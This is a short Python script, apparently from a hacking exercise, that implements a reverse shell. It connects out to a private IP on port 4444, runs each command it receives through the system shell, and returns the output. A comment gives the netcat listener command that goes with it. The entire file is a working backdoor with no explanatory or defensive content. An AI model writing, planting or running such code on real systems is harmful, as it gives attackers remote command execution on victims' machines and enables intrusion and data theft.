import socket 
import subprocess

# nc -vv -l -p 4444

def execute_system_command(command):
    return subprocess.check_output(command, shell=True)


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(('192.168.106.129',4444))

connection.send('\n[+] Connected!!!\n')

while True:
    command = connection.recv(1024)
    result = execute_system_command(command)
    connection.send(result)


connection.close()